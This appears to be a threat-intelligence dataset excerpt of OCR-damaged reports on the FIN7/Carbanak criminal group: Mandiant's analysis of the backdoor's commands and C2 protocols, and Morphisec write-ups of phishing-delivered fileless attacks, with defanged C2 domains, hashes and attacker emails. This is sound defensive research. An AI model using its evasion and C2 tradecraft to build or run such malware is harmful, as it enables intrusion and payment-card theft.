run#le 0x02032914 killbot 0x08069613 listprocess Upload #les to the C2 server Runs VNC plugin Runs speci#ed executable #le Uninstalls backdoor Returns list of running processes to the C2 server https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 8 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 0x073BE023 plugins 0x0B0603B4 0x0B079F93 killprocess 0x00006A34 cmd 0x09C573C7 runplug 0x08CB69DE autorun Change C2 protocol used by plugins Download and execute shellcode from speci#ed address Terminates the #rst process found speci#ed by name Initiates a reverse shell to the C2 server Plugin control Updates backdoor https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 9 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 Table 2: Suppo!ed Commands Con!guration A con#guration #le resides in a #le under the backdoor’s installation directory with the .bin extension. It contains commands in the same form as those listed in Table 2 that are automatically executed by the backdoor when it is sta%ed. These commands are also executed when the loadcon#g command is issued. This #le can be likened to a sta%up script for the backdoor. The state command sets a global variable containing a series of Boolean values represented as ASCII values ‘0’ or ‘1’ and also adds itself to the con#guration #le. Some of these values indicate which C2 protocol to use, whether the backdoor has been installed, and whether the PST monitoring thread is running or not. Other than the state command, all commands in the con#guration #le are identi#ed by their hash’s decimal value instead of their plain text name. Ce%ain commands, when executed, add themselves to the con#guration so they will persist across (or be pa% of) reboots. The loadcon#g and state commands are executed during initialization, e(ectively creating the con#guration #le if it does not exist and writing the state command to it. https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 10 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 Figure 1 and Figure 2 illustrate some sample, decoded con#guration #les we have come across in our investigations. Figure 1: Con""guration ""le that adds new C2 server and forces the data-stealing backdoor to use it Figure 2: Con""guration ""le that adds TCP tunnels and records desktop video Command and Control CARBANAK communicates to its C2 servers via pseudo-HTTP or a custom binary protocol. Pseudo-HTTP Protocol Messages for the pseudo-HTTP protocol are delimited with the ‘|’ character. A message sta%s with a host ID composed by https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 11 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 concatenating a hash value generated from the computer’s hostname and MAC address to a string likely used as a campaign code. Once the message has been forma!ed, it is sandwiched between an additional two #elds of randomly generated strings of upper and lower case alphabet characters. An example of a command polling message and a response to the listprocess command are given in Figure 3 and Figure 4, respectively. Figure 3: Example command polling message Figure 4: Example command response message Messages are encrypted using Microso$’s implementation of RC2 in CBC mode with PKCS#5 padding. The encrypted message is then Base64 encoded, replacing all the ‘/’ and ‘+’ characters with the ‘.’ and ‘-’ characters, respectively. The eight-byte initialization https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 12 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 vector (IV) is a randomly generated string consisting of upper and lower case alphabet characters. It is prepended to the encrypted and encoded message. The encoded payload is then made to look like a URI by having a random number of ‘/’ characters inse%ed at random locations within the encoded payload. The malware then appends a script extension (php, bml, or cgi) with a random number of random parameters or a #le extension from the following list with no parameters: gif, jpg, png, htm, html, php. This URI is then used in a GET or POST request. The body of the POST request may contain #les contained in the cabinet format. A sample GET request is shown in Figure 5. Figure 5: Sample pseudo-HTTP beacon The pseudo-HTTP protocol uses any proxies discovered by the HTTP proxy monitoring thread or added by the adminka command. The backdoor also searches for proxy con#gurations to use in the registry at https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 13 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 HKCU\So$ware\Microso$\Windows\CurrentVe rsion\Internet Se!ings and for each pro#le in the Mozilla Firefox con#guration #le at %AppData%\Mozilla\Firefox\\prefs.js. Custom Binary Protocol Figure 6 describes the structure of the malware’s custom binary protocol. If a message is larger than 150 bytes, it is compressed with an unidenti#ed algorithm. If a message is larger than 4096 bytes, it is broken into compressed chunks. This protocol has undergone several changes over the years, each version building upon the previous version in some way. These changes were likely introduced to render existing network signatures ine(ective and to make signature creation more di'cult. Figure 6: Binary protocol message format Version 1 In the earliest version of the binary protocol, https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 14 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 we have discovered that the message bodies that are stored in the #eld are simply XORed with the host ID. The initial message is not encrypted and contains the host ID. Version 2 Rather than using the host ID as the key, this version uses a random XOR key between 32 and 64 bytes in length that is generated for each session. This key is sent in the initial message. Version 3 Version 3 adds encryption to the headers. The #rst 19 bytes of the message headers (up to the #eld) are XORed with a #ve-byte key that is randomly generated per message and stored in the #eld. If the #eld of the message header is greater than one, the XOR key used to encrypt message bodies is iterated in reverse when encrypting and decrypting messages. Version 4 This version adds a bit more complexity to the header encryption scheme. The headers are https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 15 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 XOR encrypted with and combined and reversed. Version 5 Version 5 is the most sophisticated of the binary protocols we have seen. A 256-bit AES session key is generated and used to encrypt both message headers and bodies separately. Initially, the key is sent to the C2 server with the entire message and headers encrypted with the RSA key exchange algorithm. All subsequent messages are encrypted with AES in CBC mode. The use of public key cryptography makes decryption of the session key infeasible without the C2 server’s private key. The Roundup We have rounded up 220 samples of the CARBANAK backdoor and compiled a table that highlights some interesting details that we were able to extract. It should be noted that in most of these cases the backdoor was embedded as a packed payload in another executable or in a weaponized document #le of some kind. The MD5 hash is for the original executable #le that eventually launches CARBANAK, but the details of each sample https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 16 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 were extracted from memory during execution. This data provides us with a unique insight into the operational aspect of CARBANAK and can be downloaded here. Protocol Evolution As described earlier, CARBANAK’s binary protocol has undergone several signi#cant changes over the years. Figure 7 illustrates a rough timeline of this evolution based on the compile times of samples we have in our collection. This may not be entirely accurate because our visibility is not complete, but it gives us a general idea as to when the changes occurred. It has been observed that some builds of this data-stealing backdoor use outdated versions of the protocol. This may suggest multiple groups of operators compiling their own builds of this data- stealing backdoor independently. https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 17 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 Figure 7: Timeline of binary protocol versions Cloud Contact sales Get started for free Blog *It is likely that we are missing an earlier build Solutions & technology that utilized version 3. Ecosystem Developers & Practitioners Build Tool Most of CARBANAK’s strings are encrypted in order to make analysis more di'cult. We have observed that the key and the cipher texts for all the encrypted strings are changed for each sample that we have encountered, even amongst samples with the same compile time. The RC2 key used for the HTTP protocol has also been observed to change among samples with the same compile time. These observations paired with the use of campaign codes that must be con#gured denote the likely existence of a build tool. Rapid Builds Despite the likelihood of a build tool, we have found 57 unique compile times in our sample set, with some of the compile times being quite close in proximity. For example, on May 20, 2014, two builds were compiled approximately four hours apa% and were con#gured to use the same C2 servers. Again, on July 30, 2015, two builds were compiled https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 18 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 approximately 12 hours apa%. What changes in the code can we see in such sho% time intervals that would not be present in a build tool? In one case, one build was programmed to execute the runmem command for a #le named wi.exe while the other was not. This command downloads an executable from the C2 and directly runs it in memory. In another case, one build was programmed to check for the existence of the domain blizko.net in the trusted sites list for Internet Explorer while the other was not. Blizko is an online money transfer service. We have also seen that di(erent monitoring threads from Table 1 are enabled from build to build. These minor changes suggest that the code is quickly modi#ed and compiled to adapt to the needs of the operator for pa%icular targets. Campaign Code and Compile Time Correlation In some cases, there is a close proximity of the compile time of a CARBANAK sample to the month speci#ed in a pa%icular campaign code. Figure 8 shows some of the relationships that can be observed in our data set. https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 19 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 Campaign Code Compile Date Aug dec julyc jun june june 7/30/15 12/8/14 7/2/16 5/9/15 5/25/14 6/7/14 junevnc 6/20/14 juspam 7/13/14 juupd 7/13/14 may may ndjun SeP 5/20/14 5/19/15 6/7/16 9/12/14 spamaug 8/1/14 https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 20 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 spaug 8/1/14 Figure 8: Campaign code to compile time relationships Recent Updates Recently, 64 bit variants of the backdoor have been discovered. We shared details about such variants in a recent blog post. Some of these variants are programmed to sleep until a con#gured activation date when they will become active. History The “Carbanak Group” Much of the publicly released repo%ing surrounding the CARBANAK malware refers to a corresponding “Carbanak Group”, who appears to be behind the malicious activity associated with this data-stealing backdoor. FireEye iSIGHT Intelligence has tracked several separate overarching campaigns employing the CARBANAK tool and other associated backdoors, such as DRIFTPIN (aka Toshliph). With the data available at this time, it is unclear how interconnected these https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 21 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 campaigns are – if they are all directly orchestrated by the same criminal group, or if these campaigns were perpetrated by loosely a'liated actors sharing malware and techniques. FIN7 In all Mandiant investigations to date where the CARBANAK backdoor has been discovered, the activity has been a!ributed to the FIN7 threat group. FIN7 has been extremely active against the U.S. restaurant and hospitality industries since mid-2015. FIN7 uses CARBANAK as a post-exploitation tool in later phases of an intrusion to cement their foothold in a network and maintain access, frequently using the video command to monitor users and learn about the victim network, as well as the tunnel command to proxy connections into isolated po%ions of the victim environment. FIN7 has consistently utilized legally purchased code signing ce%i#cates to sign their CARBANAK payloads. Finally, FIN7 has leveraged several new techniques that we have not observed in other CARBANAK related activity. We have covered recent FIN7 activity in previous public blog posts: https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 22 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings FIN7 Evolution and the Phishing LNK To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence The FireEye iSIGHT Intelligence MySIGHT Po%al contains additional information on our investigations and observations into FIN7 activity. Widespread Bank Targeting Throughout the U.S., Middle East and Asia Proofpoint initially repo%ed on a widespread campaign targeting banks and #nancial organizations throughout the U.S. and Middle East in early 2016. We identi#ed several additional organizations in these regions, as well as in Southeast Asia and Southwest Asia being targeted by the same a!ackers. This cluster of activity persisted from late 2014 into early 2016. Most notably, the infrastructure utilized in this campaign overlapped with LAZIOK, NETWIRE and other malware targeting similar #nancial entities in these regions. DRIFTPIN https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 23 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 DRIFTPIN (aka Spy.Agent.ORM, and Toshliph) has been previously associated with CARBANAK in various campaigns. We have seen it deployed in initial spear phishing by FIN7 in the #rst half of 2016. Also, in late 2015, ESET repo%ed on CARBANAK associated a!acks, detailing a spear phishing campaign targeting Russian and Eastern European banks using DRIFTPIN as the malicious payload. Cypho% Labs also revealed that variants of DRIFTPIN associated with this cluster of activity had been deployed via the RIG exploit kit placed on two compromised Ukrainian banks’ websites. FireEye iSIGHT Intelligence observed this wave of spear phishing aimed at a large array of targets, including U.S. #nancial institutions and companies associated with Bitcoin trading and mining activities. This cluster of activity continues to be active now to this day, targeting similar entities. Additional details on this latest activity are available on the FireEye iSIGHT Intelligence MySIGHT Po%al. Earlier CARBANAK Activity In December 2014, Group-IB and Fox-IT released a repo% about an organized criminal group using malware called ""Anunak"" that has https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 24 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 targeted Eastern European banks, U.S. and European point-of-sale systems and other entities. Kaspersky released a similar repo% about the same group under the name ""Carbanak"" in February 2015. The name “Carbanak” was coined by Kaspersky in this repo% – the malware authors refer to the backdoor as Anunak. This activity was fu%her linked to the 2014 exploitation of ATMs in Ukraine. Additionally, some of this early activity shares a similarity with current FIN7 operations – the use of Power Admin PAExec for lateral movement. Conclusion The details that can be extracted from CARBANAK provide us with a unique insight into the operational details behind this data- stealing malware. Several inferences can be made when looking at such data in bulk as we discussed above and are summarized as follows: 1. Based upon the information we have observed, we believe that at least some of the operators of CARBANAK either have access to the source code directly with knowledge on how to modify it or have a close relationship to the developer(s). https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 25 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 2. Some of the operators may be compiling their own builds of the backdoor independently. 3. A build tool is likely being used by these a!ackers that allows the operator to con#gure details such as C2 addresses, C2 encryption keys, and a campaign code. This build tool encrypts the binary’s strings with a fresh key for each build. 4. Varying campaign codes indicate that independent or loosely a'liated criminal actors are employing CARBANAK in a wide-range of intrusions that target a variety of industries but are especially directed at #nancial institutions across the globe, as well as the restaurant and hospitality sectors within the U.S. Posted in Threat Intelligence—Security & Identity Related articles https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 26 di 27"
fin7,cti-hal,5827b4a5aab7,G0046,"FIN7 Takes Another Bite at the Restaurant Industry 10/09/24, 11:31 Cybersecurity Blog Cybersecurity News, Threat Research, And More From The Team Spearheading The Evolution Of Endpoint Security FIN7 Takes Another Bite at the Restaurant Industry Posted by Michael Gorelik on June 9, 2017 Find me on: LinkedIn Twitter Post Share Share 0 Subscribe to our blog Stay in the loop with industry insight, cyber security trends, and cyber attack information and company updates. https://blog.morphisec.com/fin7-attacks-restaurant-industry Pagina 1 di 14 First Name*Last Name*Email*Company* FIN7 Takes Another Bite at the Restaurant Industry 10/09/24, 11:31 Subscribe INTRODUCTION Search Our Site On June 7, 2017, Morphisec Lab identiﬁed a new, highly sophisticated ﬁleless attack targeting restaurants across the US. The ongoing campaign allows hackers to seize system control and install a backdoor to steal ﬁnancial information at will. It incorporates some never before seen evasive techniques that allow it to bypass most security solutions – signature and behavior based. Aside from these updated techniques, Morphisec’s investigation revealed an almost perfect match to FIN7 attack methods. Past highly successful and damaging attacks on banks, SEC personnel, large restaurant chains and hospitality organizations have all been attributed to the ﬁnancially- motivated FIN7 group. FIN7, which is also associated with the Carbanak gang, must be seen as one of the leading threat actor groups operating today. Like past attacks, the initial infection vector is a malicious Word document attached to a phishing email that is well-tailored to the targeted business Recent Posts Vulnerability Whisperer: Turning Headaches to High-Fives Decoding the Puzzle: Cicada3301 Ransomware Threat Analysis Preventing Threats Before Inﬁltration: Morphisec AMTD in Action From Trading Floors to ATMs: 5 Unexpected Cyber Exposure https://blog.morphisec.com/fin7-attacks-restaurant-industry Pagina 2 di 14 Keyword... FIN7 Takes Another Bite at the Restaurant Industry 10/09/24, 11:31 and its day-to-day operations. The Word document executes a ﬁleless attack that uses DNS queries to deliver the next shellcode stage (Meterpreter). However, in this new variant, all the DNS activity is initiated and executed solely from memory – unlike previous attacks which used PowerShell commands. OpenDNS investigate data, shared in coordination with the Cisco Advanced Threat Research & Efﬁcacy Team, shows that this is a large-scale, currently active attack with peaks of more than 10K DNS requests per hour. Alarmingly, the detection score on VirusTotal for all of the documents continues to be 0/56 from the time the ﬁrst documents were uploaded (1.6.2017) up until the date of this publication. This means the attackers successfully bypass static analysis by most of the security solutions. By contrast, Morphisec’s Moving Target Defense- based technology prevents the attack in its early stages, before any channel to the attacker is opened. Challenges in Finance Staying One Step Ahead: The Ultimate Anti-Ransomware Assurance Checklist AMTD Featured in Gartner® Hype Cycle™ for Endpoint and Workspace Security, 2024 Technical Analysis: CVE- 2024-38021 CVE-2024-38173: Outlook Form Injection RCE Vulnerability Patched Technical Analysis: CVE- 2024-30103 The Evolution of MDR: Adding Prevention First Posts by Tag Automated Moving Target Defense (148) Cyber Security News (130) Threat Research (129) Morphisec Labs (118) https://blog.morphisec.com/fin7-attacks-restaurant-industry Pagina 3 di 14 FIN7 Takes Another Bite at the Restaurant Industry 10/09/24, 11:31 Morphisec News (55) See all TECHNICAL ANALYSIS Below we describe the full technical details, beginning with the initial email through the ﬁnal Meterpreter session used to hijack the computer. PHISHING EMAIL: As seen in the email below, FIN7’s attack campaign targets restaurants. The content of the email is well crafted to avoid suspicion. Some of the email attachments are called menu.rtf, others Olive Garden.rtf or Chick Fil A Order.rtf (all the identiﬁed hashes are listed at the end). WORD DELIVERY: The attached .rtf ﬁle uses OLE and has many similarities to previous FIN7 attacks. But this attack, instead of activating hta ﬁles (mshta.exe) from within the link, executes obfuscated JavaScript code. All the victim needs to do is double click on the envelope and press OK. https://blog.morphisec.com/fin7-attacks-restaurant-industry Pagina 4 di 14 FIN7 Takes Another Bite at the Restaurant Industry 10/09/24, 11:31 JAVASCRIPT CODE SNIPPETS: The ﬁrst stage JavaScript copies additional JavaScript code snippets in txt format from the RTF document into a random directory “C:\Users\<User Name>\<Random guid>\”. The same code snippets are combined into a second stage JavaScript in “C:\Users\<User Name>\”. Additionally, the ﬁrst stage JavaScript creates a scheduled task that executes the second stage code within a minute – this delayed execution helps to bypass behavior analysis since the second stage is not directly executed by the ﬁrst stage. https://blog.morphisec.com/fin7-attacks-restaurant-industry Pagina 5 di 14 FIN7 Takes Another Bite at the Restaurant Industry 10/09/24, 11:31 PERSISTENCY: In some cases, an additional scheduled task “AdobeFlashSync” is created for persistency. This task is executed every 25 minutes and will repeat the actions described above – recreating the JavaScript code which later will create and execute a PowerShell script (described below). SECOND STAGE JAVASCRIPT INTO POWERSHELL: The second stage JavaScript creates a PowerShell ﬁle with the same name in the same directory. Afterwards, it deletes its own JavaScript code traces. https://blog.morphisec.com/fin7-attacks-restaurant-industry Pagina 6 di 14 FIN7 Takes Another Bite at the Restaurant Industry 10/09/24, 11:31 The PowerShell script executes a compressed ﬁrst stage PowerShell child process, which then performs a second stage PowerShell process. The latter PowerShell injects a shellcode into its own process using well-known CreateThread and VirtualAlloc techniques: SHELLCODE: The shellcode phase of this attack is unique and https://blog.morphisec.com/fin7-attacks-restaurant-industry Pagina 7 di 14 FIN7 Takes Another Bite at the Restaurant Industry 10/09/24, 11:31 demonstrates the constantly advancing abilities of attackers. The shellcode is the primary differentiating technique between this campaign and past attacks by FIN7 and other threat actors. This shellcode iterates over process environment block and looks immediately for dnsapi.dll name (xor 13) and its DnsQueryA function. Basically, FIN7 implemented a shellcode that gets the next stage shellcode using the DNS messaging technique directly from memory. This way they can successfully evade many of the behavior based solutions. 囚医 10c_217182: push call ebp 56A2B5F9h 已蓝 sub_21788Fprocnear ;FUNCTIONCHUNKAT00217130SIZE08000070BYTES Sleep: push push call mov mou mou jmp 13E8h SE935F944h ebp eax,esi ecx,[eax] De2160es ENDOFFUNCTIONCHUNKFORsub21708F ;kernel32?Sleep ;kernel32?VirtualAlloc In the DNS query pattern, it is very clear to see that alphabetical modiﬁcation of the subdomain preﬁx is used: ;kernel32!LoadLibraryAdosapi push push push push call mOU 百蓝 10c_217865: jmpmp aur Short 1oc 217138sub_21708Fendp;sp-analysisfailed https://blog.morphisec.com/fin7-attacks-restaurant-industry Pagina 8 di 14 pop xOr push noU push push push push call push nOU xor moU ebp eax,eax 48h;'a' ah,18h 1999h /FFFFh SE553A458h ebp eax edi,eax eax,eax h,20h;1: ah, eax 6173664h esp 726774Ch ebp ebx,61h; 'al FIN7 Takes Another Bite at the Restaurant Industry 10/09/24, 11:31 Each such DNS query results in an additional snippet of shellcode being appended to a reallocated buffer. When, ﬁnally, the ﬁrst stage shellcode receives a special “FF” signal, it then executes the delivered shellcode. (It takes a few minutes for the DNS queries to ﬁnish. The last query is to the subdomain ihc[.]stage[.]12019683[.]ns2[.]true-deals[.]com): The delivered second stage shellcode is encrypted: https://blog.morphisec.com/fin7-attacks-restaurant-industry Pagina 9 di 14 FIN7 Takes Another Bite at the Restaurant Industry 10/09/24, 11:31 METERPRETER: After decryption of the second stage shellcode, the shellcode deletes the ‘MZ’ preﬁx from within a very important part of the shellcode. This preﬁx indicates it may be a dll, and its deletion helps the attack to evade memory scanning solutions. Just before this step executed, we extracted the dll from memory and uploaded it to VirusTotal. If this dll was saved on disk, many security solutions would immediately identify it as a CobaltStrike Meterpreter, which is used by many attackers and pen testers. Having a Meterpreter session on a compromised computer allows for full control of the computer and exﬁltration of any data, and in some cases lateral movement inside the organization. Support Partners Under Attack? Products Solutions Company Resources https://blog.morphisec.com/fin7-attacks-restaurant-industry Pagina 10 di 14 FIN7 Takes Another Bite at the Restaurant Industry 10/09/24, 11:31 CONCLUSIONS: FIN7 constantly upgrades their attacks and evasion techniques, thus becoming even more dangerous and unpredictable. The analysis of this attack shows, how easy it is for them to bypass static, dynamic and behavior based solutions. These attacks pose a severe risk to enterprises. Fileless attacks are on the rise – Carbon Black reports that researchers found a 33% rise in severe non-malware attacks in Q4 2016 compared to Q1. Defenders will see more attacks on their businesses by hacker groups utilizing memory for evasion while keeping executable artifacts far away from disk. In this continuously evolving threat landscape, https://blog.morphisec.com/fin7-attacks-restaurant-industry Pagina 11 di 14 FIN7 Takes Another Bite at the Restaurant Industry 10/09/24, 11:31 enterprises need to look for new defenses that are resilient to such changes and are able to prevent ﬁleless attacks. Morphisec Endpoint Threat Prevention specializes in preventing in-memory attacks, using Moving Target Defense to make the target itself unpredictable. ARTIFACTS: Documents: 2781526f6b302da00661b9a6a625a5a6ecf4ffccafa61202e9b0e9b61b657867 c357396ca82fdcd6b6f46b748f2b6941051dbc81be5326cf9548e6e95507af7c ffebcc4d2e851baecd89bf11103e3c9de86f428fdeaf0f8b33d9ea6f5ef56685 Domains: true-deals[.]com; strikes-withlucky[.]com Email account in registration is: isvarawski@yahoo.com Attacker email account: adrian.1987clark@yahoo.com https://blog.morphisec.com/fin7-attacks-restaurant-industry Pagina 12 di 14"
fin7,cti-hal,26708fba7e15,G0046,"HOW FIN7 ATTACKED AND STOLE DATA Sophisticated Social Engineering: Phishing & Calling FIN7 typically initiated its cyberattacks by delivering a “phishing” email to a company employee. Each email included an attached file, often an innocuous-appearing Microsoft Word document, with embedded malware. The text within the email simulated a legitimate business- related message in order to lead the recipient employee to open the attachment and unwittingly activate the malware that would infect the computer. For example, when targeting a hotel chain, the sender of the phishing email might claim to be interested in making a reservation with details enclosed in the attachment. When targeting a restaurant, the phishing email might refer to placing a large catering order or voice a complaint about prior service or food quality, further described in an attachment. Examples of phishing emails deployed by FIN7 are below. In many cases, FIN7 would accompany the phishing emails with a telephone call to the victim company employee about the same topic, which was intended to legitimize the phishing email. The caller often directed the employee to the recently sent phishing email to further entice the employee to open the attached file and activate the malware. Network Intrusion: Control & Data Exfiltration Once infected, the compromised victim computer connected to one of FIN7’s command and control servers located throughout the world. Through a specially designed control panel, FIN7 could download a wide array of additional malware to the victim computer, remotely send commands and receive data, and move laterally through the company’s network. Among other tools, FIN7 incorporated and adapted the notorious Carbanak malware, which was used by other cybercriminals in a massive transnational attack on the banking industry. FIN7’s malware allowed its members to conduct surveillance on company employees, including taking screen shots and even video recordings of desktop activity, enabling them to secretly steal credentials and other network information. FIN7 then used its unauthorized access to the victim’s computer system to locate and extract various information and property of value, such as financial information and caches of customer payment card data. FIN7 most commonly focused on fast-food and casual dining restaurants, hotels, casinos, and businesses with a high frequency of point-of-sale transactions, including businesses with dozens of locations operating in Western Washington. With these and other victims, FIN7 sought to steal credit, debit, and in some cases gift card data, used during legitimate customer purchases. Selling Stolen Cards Since 2015, FIN7 successfully stole data for more than 16 million payment cards, many of which have been offered for sale through online underground marketplaces for stolen data. The purchasers could then use the stolen card numbers to make unauthorized charges on accounts belonging to unsuspecting cardholders. Investigators have observed typical retail purchases as well as the purchase of gift cards. Who is FIN7? FIN7 is one of the most sophisticated and aggressive malware schemes in recent times, consisting of dozens of talented hackers located overseas. FIN7 uses an arsenal of constantly evolving malware tools and hacking techniques, and controls infected computers through a complex web of servers located throughout the world. The masterminds behind the criminal enterprise created a fake computer security business called Combi Security, which they used to recruit new members and to add a thin veil of legitimacy to the hacking scheme. However, there was nothing legitimate about the scores of attacks FIN7 launched against over 100 unsuspecting victims."
fin7,cti-hal,e5dae1a43a35,G0046,"FIN7 Not Finished – Morphisec Spots New Campaign 06/09/24, 10:23 Cybersecurity Blog Cybersecurity News, Threat Research, And More From The Team Spearheading The Evolution Of Endpoint Security FIN7 Not Finished – Morphisec Spots New Campaign Posted by Michael Gorelik on November 21, 2018 Find me on: LinkedIn Twitter Post Share Share 0 This blog was co-authored by Alon Groisman. Subscribe to our blog Stay in the loop with industry insight, cyber security trends, and cyber attack information and company updates. https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign Pagina 1 di 11 First Name*Last Name*Email*Company* FIN7 Not Finished – Morphisec Spots New Campaign 06/09/24, 10:23 Subscribe It seems like the rumors of FIN7’s decline have been hasty. Just a few months after the well- publicized indictment of three high-ranking members in August, Morphisec has identiﬁed a new FIN7 campaign that appears to be targeting the restaurant industry. FIN7, also known as Carbanak, is one of the major threat groups tracked by Morphisec and numerous other security entities, and among the top three criminal computer intrusion cases that the FBI is currently working. FIN7 is composed of a very sophisticated network of developers and hackers and brings in an estimated $50 million a month. They target very speciﬁc industries, hospitality – hotels and restaurants – being one of them, and are behind a string of high-proﬁle breaches including Red Robin, Chili’s, Arby’s, Burgerville, Omni Hotels and Saks Fifth Avenue, among many others. FIN7 is known for its stealth techniques and ability to continuously evade security systems. In the case of Burgerville, malware sat on the company’s network collecting payment data for nearly a year before it was discovered. And that was only due to an FBI investigation. Search Our Site Recent Posts Vulnerability Whisperer: Turning Headaches to High-Fives Decoding the Puzzle: Cicada3301 Ransomware Threat Analysis Preventing Threats Before Inﬁltration: Morphisec AMTD in Action From Trading Floors to ATMs: 5 Unexpected Cyber Exposure https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign Pagina 2 di 11 Keyword... FIN7 Not Finished – Morphisec Spots New Campaign 06/09/24, 10:23 In this blog post, we present our ﬁndings on two campaigns, which occurred in the ﬁrst and second weeks of November. These campaigns follow patterns similar to those presented by FireEye in August but with just enough variations to bypass many security vendors. Challenges in Finance Staying One Step Ahead: The Ultimate Anti-Ransomware Assurance Checklist Technical Description The initial document was probably sent within the Baltic region (or tested there). It was submitted to VirusTotal from Latvia. The name of the document translated from Russian is “new questioner”. It is password-protected with the password: “goodmorning”. AMTD Featured in Gartner® Hype Cycle™ for Endpoint and Workspace Security, 2024 Technical Analysis: CVE- 2024-38021 Oprosnik_new.doc 6e1230088a34678726102353c622445e1f8b8b8c9ce1f025d11bfffd5017ca82) CVE-2024-38173: Outlook Form Injection RCE Vulnerability Patched Technical Analysis: CVE- 2024-30103 The Evolution of MDR: Adding Prevention First Posts by Tag Automated Moving Target Defense (147) Cyber Security News (130) Threat Research (128) Morphisec Labs (117) https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign Pagina 3 di 11 FIN7 Not Finished – Morphisec Spots New Campaign 06/09/24, 10:23 Morphisec News (55) See all It uses social engineering to convince the recipient to enable macros through the use of the images, logo and tagline of a newly launched, legitimate VPN tool InvinciBull by cybersecurity company Finjan. If the “enable macro” button is activated, the following obfuscated Macro runs and the next stage obfuscated JavaScript is extracted from the form caption, similar to the last several FIN7 campaigns. https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign Pagina 4 di 11 FIN7 Not Finished – Morphisec Spots New Campaign 06/09/24, 10:23 Examining the metadata of the document, it clearly shows that the document was created on the 11.02.2018: Following deobfuscation of the macro, we notice known FIN7 patterns of executing JavaScript from VBScript with the slight modiﬁcation of copying the wscript.exe ﬁle and renaming it to mses.exe. This may allow it to bypass some EDR solutions that are tracing WScript by name. https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign Pagina 5 di 11 FIN7 Not Finished – Morphisec Spots New Campaign 06/09/24, 10:23 Below is the obfuscated JavaScript that is written to the temp directory as error.txt ﬁle. The obfuscation pattern is similar to previously seen FIN7 patterns and most probably is a derivation of the same obfuscation toolkit. Deobfuscated JavaScript The deobfuscated JavaScript is actually a backdoor component that directly communicates to the C2 server (in this case hxxps://bing-cdn[.]com). It executes the response which is yet another https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign Pagina 6 di 11 FIN7 Not Finished – Morphisec Spots New Campaign 06/09/24, 10:23 JavaScript command, which can be evaluated by eval. Although there have been slight modiﬁcations in the Macro delivery in the last couple of campaigns, the JavaScript backdoor stays the same, including its communication protocol. During the ﬁrst request, the MAC address and the computer domain are also delivered to the target C2. We believe that the next stage is only delivered to speciﬁc targets based on domains as the data that is delivered in the ﬁrst request is very limited. Yara Rules Some additional observations that can be used to create Yara-rules for this campaign are the locations of the loaded VBControl ﬁles that are written in clear text as part of the document ﬁles: Additional Samples https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign Pagina 7 di 11 FIN7 Not Finished – Morphisec Spots New Campaign 06/09/24, 10:23 After this search, we identiﬁed more samples that were created just a couple of days ago and point to a known C2 registered to the same entity (hxxps://googleapi-cdn[.]com) Below is a summary of information for one of those documents: Support Partners Under Attack? The document was submitted from Ukraine (yet Solutions another former soviet union country) with the name “dinners.doc” 